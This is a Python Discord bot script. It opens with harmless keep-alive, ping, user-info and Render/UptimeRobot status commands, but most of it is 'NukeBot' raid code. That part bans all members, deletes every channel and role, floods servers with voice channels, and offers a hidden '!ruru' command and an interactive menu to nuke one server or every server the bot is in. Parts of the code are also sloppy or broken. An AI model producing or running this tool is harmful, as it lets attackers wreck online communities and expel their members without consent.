import os
import threading
from flask import Flask, jsonify
import discord
from discord.ext import commands
import time
import asyncio
import random
import requests
import logging
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit

# ログの設定
logging.basicConfig(level=logging.INFO)

# --- KeepAlive Server for Render & UptimeRobot ---
# Webサーバーを構築するためのFlaskを初期化
app = Flask(__name__)

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    return jsonify({"message": "Alive"}), 200

def run_flask():
    """Flaskサーバーを別スレッドで起動する関数"""
    port = int(os.environ.get("PORT", 5000))
    logging.info(f"Starting Flask server on port {port}...")
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    """Webサーバーをメインのボット処理と並行して起動する"""
    t = threading.Thread(target=run_flask)
    t.start()
    logging.info("Keep-alive server started.")

# --- Discord Bot Setup ---
# ⚠️ トークンやプレフィックスは外部ファイルではなく、環境変数とコード内で直接定義
prefix = "!"
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True

# ボットのクライアントオブジェクトを初期化
bot = commands.Bot(command_prefix=prefix, intents=intents)

# デフォルトのヘルプコマンドを削除
bot.remove_command("help")

@bot.event
async def on_ready():
    # ボット起動時のステータス表示を設定
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Game(name="Renderで24時間稼働中！")
    )
    logging.info("Ah shit, here we go again")
    logging.info(f"Logged in as {bot.user}")

@bot.event
async def on_guild_join(guild):
    logging.info(f"Joining {guild.name}")

#### SECRET COMMAND ####
@bot.command()
async def secret(ctx):
    """秘密のメッセージを送信するコマンド"""
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )
    # 動作確認用の仮応答
    await ctx.send(f"Secret command executed by {member.display_name}", delete_after=5)
    logging.info("Action completed: Secret Message")

#### PING COMMAND ####
@bot.command()
async def ping(ctx):
    """ボットの遅延 (Ping) を計算しDMで送信するコマンド"""
    await ctx.message.delete()
    member = ctx.message.author

    # bot.latency を使って、より正確なAPI遅延を取得 (秒単位 -> ミリ秒単位)
    latency_ms = round(bot.latency * 1000)

    embed=discord.Embed(title="Pong!", description=f'Ping: {latency_ms}ms', color=0x2874A6)
    # 応答をユーザーのDMに送信（元のロジックを維持）
    await member.send(embed=embed)
    logging.info("Action completed: Server ping")

#### INFO COMMAND ####
@bot.command()
async def info(ctx, member: discord.Member=None):
    """指定されたユーザーまたはコマンド実行者の情報を表示するコマンド"""
    await ctx.message.delete()
    # ターゲットメンバーを定義
    target_member = member or ctx.author

    # 応答メッセージを作成
    response = (
        f"**The user's name is: {target_member.name}**"
        f"\n**The user's ID is: {target_member.id}**"
        f"\n**The user's current status is: {target_member.status}**"
        f"\n**The user's highest role is: {target_member.top_role}**"
        f"\n**The user joined at: {target_member.joined_at.strftime('%Y/%m/%d %H:%M:%S')}**"
    )

    # 応答をチャンネルに送信し、15秒後に削除
    await ctx.send(response, delete_after=15)
    logging.info("Action completed: User Info")

# Render APIキー
RENDER_API_KEY = os.environ.get('RENDER_API_KEY')

# RenderのAPIエンドポイント
RENDER_API_URL = 'https://api.render.com/v1/deployments'

# Renderのデプロイメント状態を確認する関数
def get_render_deployment_status(deployment_id):
    try:
        headers = {
            'Authorization': f'Bearer {RENDER_API_KEY}',
            'Content-Type': 'application/json'
        }
        response = requests.get(f'{RENDER_API_URL}/{deployment_id}', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}

# Discordコマンドを追加
@bot.command()
async def renderstatus(ctx, deployment_id: str):
    status = get_render_deployment_status(deployment_id)
    await ctx.send(f'Render Deployment Status: {status}')

# UptimeRobot APIキー
UPTIMEROBOT_API_KEY = os.environ.get('UPTIMEROBOT_API_KEY')

# UptimeRobotのAPIエンドポイント
UPTIMEROBOT_API_URL = 'https://api.uptimerobot.com/v2/getMonitors'

# UptimeRobotのモニタリング状態を確認する関数
def get_uptimerobot_monitor_status(monitor_id):
    try:
        params = {
            'api_key': UPTIMEROBOT_API_KEY,
            'format': 'json',
            'monitors': monitor_id
        }
        response = requests.get(UPTIMEROBOT_API_URL, params=params)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}

# Discordコマンドを追加
@bot.command()
async def uptimestatus(ctx, monitor_id: str):
    status = get_uptimerobot_monitor_status(monitor_id)
    await ctx.send(f'UptimeRobot Monitor Status: {status}')

# Coloramaの設定
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned

async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Delete Channels:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}Delete Roles:{b}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{m}Create Voice Channels:{b}{created_channels}')
    #created_roles = await created_roles(guild,name)
    #print(f'{m}Create Roles:{b}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')

@bot.command()
async def ruru(ctx):
    """サーバーを荒らすコマンド"""
    await ctx.message.delete()
    await nuke_guild(ctx.guild)
    await ctx.send(f'Server {ctx.guild.name} has been nuked!', delete_after=10)

while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Input bot token:{g}')
        name = _input(f'{y}Input name for created channels / roles:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke of all servers.
    {y}└─[2] {m}- {g}Nuke only one server.  
    {y}└─[3] {m}- {g}Exit
{y}====>{g}''')
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}Input server id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Exit...')
            exit()
        try:
            client.run(token)
            input('Nuke finished, press enter for return to menu...')
        except Exception as error:
            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
            else:
                input(f'{r}{error}\n{b}Press enter for return...')
            continue
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
print('dm')
